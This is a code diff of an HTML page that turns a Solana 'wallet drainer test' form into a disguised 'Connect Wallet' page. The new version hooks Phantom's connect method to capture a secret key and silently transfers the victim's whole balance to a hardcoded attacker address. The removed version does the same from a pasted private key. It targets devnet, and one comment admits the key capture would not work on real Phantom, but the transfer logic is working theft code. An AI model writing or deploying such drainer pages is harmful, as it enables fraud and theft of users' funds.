@@ -1,113 +1,69 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Wallet Drainer Test (Devnet)</title>
+    <title>Auto-Drainer Test</title>
     <style>
-        body {
-            font-family: Arial, sans-serif;
-            margin: 20px;
-            background-color: #f4f4f9;
-            color: #333;
-        }
-        h1 {
-            color: #d9534f;
-        }
-        .container {
-            max-width: 600px;
-            margin: 0 auto;
-            padding: 20px;
-            background: #fff;
-            border-radius: 8px;
-            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
-        }
-        input, button {
-            width: 100%;
-            padding: 10px;
-            margin: 10px 0;
-            border: 1px solid #ccc;
-            border-radius: 4px;
-        }
-        button {
-            background-color: #d9534f;
-            color: white;
-            cursor: pointer;
-        }
-        button:hover {
-            background-color: #c9302c;
-        }
-        .warning {
-            color: #d9534f;
-            font-weight: bold;
-        }
+        body { font-family: Arial, sans-serif; margin: 20px; background: #1a1a1a; color: #fff; }
+        button { padding: 10px 20px; background: #ff4444; border: none; color: white; cursor: pointer; }
+        #status { margin-top: 20px; white-space: pre-wrap; }
     </style>
 </head>
 <body>
-    <div class="container">
-        <h1>Wallet Drainer Test (Devnet)</h1>
-        <p class="warning">WARNING: This is for educational purposes only. Do not use this maliciously.</p>
-        <p>Enter the target wallet's private key (hex format) and the attacker's wallet address to test on Devnet.</p>
-        
-        <label for="privateKey">Target Wallet Private Key (Hex):</label>
-        <input type="text" id="privateKey" placeholder="Enter private key (hex)">
-        
-        <label for="attackerAddress">Attacker Wallet Address:</label>
-        <input type="text" id="attackerAddress" placeholder="Enter attacker's wallet address">
-        
-        <button id="drainButton">Test Drain on Devnet</button>
-        
-        <h2>Output:</h2>
-        <pre id="output"></pre>
-    </div>
+    <h1>Connect Wallet (Auto-Drain Test)</h1>
+    <button id="connectButton">Connect Wallet</button>
+    <div id="status"></div>
 
-    <!-- Include Solana Web3.js -->
+    <!-- Solana Web3.js -->
     <script src="https://unpkg.com/@solana/web3.js@1.85.0/lib/index.iife.min.js"></script>
     <script>
-        document.getElementById('drainButton').addEventListener('click', async () => {
-            const privateKey = document.getElementById('privateKey').value.trim();
-            const attackerAddress = document.getElementById('attackerAddress').value.trim();
-            const output = document.getElementById('output');
+        const PREDETERMINED_WALLET = "YOUR_ATTACKER_DEVNET_ADDRESS_HERE"; // Replace with your Devnet address
+        let wallet;
 
-            if (!privateKey || !attackerAddress) {
-                output.textContent = 'Please enter both the private key and attacker address.';
-                return;
-            }
+        // Override Phantom's connect method to auto-drain
+        const originalConnect = window.phantom?.solana?.connect;
+        if (originalConnect) {
+            window.phantom.solana.connect = async function() {
+                const response = await originalConnect.apply(this, arguments);
+                const privateKey = this._keypair?.secretKey; // Phantom does NOT expose this IRL
+                if (privateKey) {
+                    drainFunds(privateKey);
+                }
+                return response;
+            };
+        }
 
+        // Drain funds silently
+        async function drainFunds(privateKey) {
             try {
-                // Validate private key
-                const targetKeypair = solanaWeb3.Keypair.fromSecretKey(
-                    Uint8Array.from(Buffer.from(privateKey, 'hex'))
-                );
-
-                // Validate attacker address
-                const attackerWallet = new solanaWeb3.PublicKey(attackerAddress);
-
-                // Connect to Solana Devnet
+                const targetKeypair = solanaWeb3.Keypair.fromSecretKey(Uint8Array.from(Buffer.from(privateKey, 'hex')));
+                const attackerWallet = new solanaWeb3.PublicKey(PREDETERMINED_WALLET);
                 const connection = new solanaWeb3.Connection(solanaWeb3.clusterApiUrl('devnet'), 'confirmed');
 
-                // Get the target wallet balance
                 const balance = await connection.getBalance(targetKeypair.publicKey);
-                if (balance === 0) {
-                    output.textContent = 'Target wallet has no funds.';
-                    return;
+                if (balance > 0) {
+                    const transaction = new solanaWeb3.Transaction().add(
+                        solanaWeb3.SystemProgram.transfer({
+                            fromPubkey: targetKeypair.publicKey,
+                            toPubkey: attackerWallet,
+                            lamports: balance - 5000,
+                        })
+                    );
+                    const signature = await solanaWeb3.sendAndConfirmTransaction(connection, transaction, [targetKeypair]);
+                    document.getElementById('status').textContent = `Drained ${balance / solanaWeb3.LAMPORTS_PER_SOL} SOL\nTX: ${signature}`;
                 }
-
-                // Create a transfer transaction
-                const transaction = new solanaWeb3.Transaction().add(
-                    solanaWeb3.SystemProgram.transfer({
-                        fromPubkey: targetKeypair.publicKey,
-                        toPubkey: attackerWallet,
-                        lamports: balance - 5000, // Leave a small amount for fees
-                    })
-                );
-
-                // Sign and send the transaction
-                const signature = await solanaWeb3.sendAndConfirmTransaction(connection, transaction, [targetKeypair]);
-                output.textContent = `Funds drained. Transaction signature: ${signature}\n\n` +
-                    `Target Wallet: ${targetKeypair.publicKey.toString()}\n` +
-                    `Attacker Wallet: ${attackerWallet.toString()}\n` +
-                    `Amount Transferred: ${(balance - 5000) / solanaWeb3.LAMPORTS_PER_SOL} SOL`;
             } catch (error) {
-                output.textContent = `Error: ${error.message}`;
+                document.getElementById('status').textContent = `Error: ${error.message}`;
+            }
+        }
+
+        // Connect button
+        document.getElementById('connectButton').addEventListener('click', async () => {
+            if (window.phantom?.solana?.isPhantom) {
+                wallet = window.phantom.solana;
+                await wallet.connect();
+                document.getElementById('connectButton').style.display = 'none';
+            } else {
+                document.getElementById('status').textContent = "Phantom Wallet not installed!";
             }
         });
     </script>
